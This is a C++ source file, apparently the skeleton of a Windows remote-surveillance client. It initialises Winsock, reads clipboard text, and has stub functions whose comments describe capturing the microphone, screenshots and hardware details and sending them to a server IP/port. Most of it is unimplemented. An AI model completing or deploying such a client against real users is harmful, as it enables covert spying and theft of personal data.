#include "packet.h"
#include "network.h"

#pragma comment(lib,"Ws2_32.lib")

wsaWrapper::wsaWrapper() {
    res = WSAStartup(MAKEWORD(2, 2), &wsa);
    if (res != 0) {
        printf("WSAStartup failed: %d\n", res);
    }
}

wsaWrapper::~wsaWrapper()
{
       WSACleanup();
}

namespace network {

    int _connect(std::string, short PORT)
    {
        
        //initialise wsa, setup client/srv details and CONNECT to IP/PORT
        return 0;
    }
    int _sendClipbord() {
        
        if (OpenClipboard(nullptr))
        {
            HANDLE hndl = GetClipboardData(CF_TEXT);     

            std::cout << (char*)hndl; // just for debug
           
        }

        

        // take clipboard  FORMAT DATA WITH PROPPER HEADER see packet.h header and send to server... -> IP/PORT
        return 0;
    }

    int _captureMic() {
        //captureMic see audio.h  FORMAT DATA WITH PROPPER HEADER see packet.h header and send to server... -> IP/PORT
        return 0;
    }
    int _sendScrShot() {
        //take desktop screenshot FORMAT DATA WITH PROPPER HEADER see packet.h header and send to server... -> IP/PORT
        return 0;
    }

    int _sendHWSpecs() {
        //get HW specs , FORMAT DATA WITH PROPPER HEADER see packet.h header and send to server... -> IP/PORT
        return 0;
    }

}
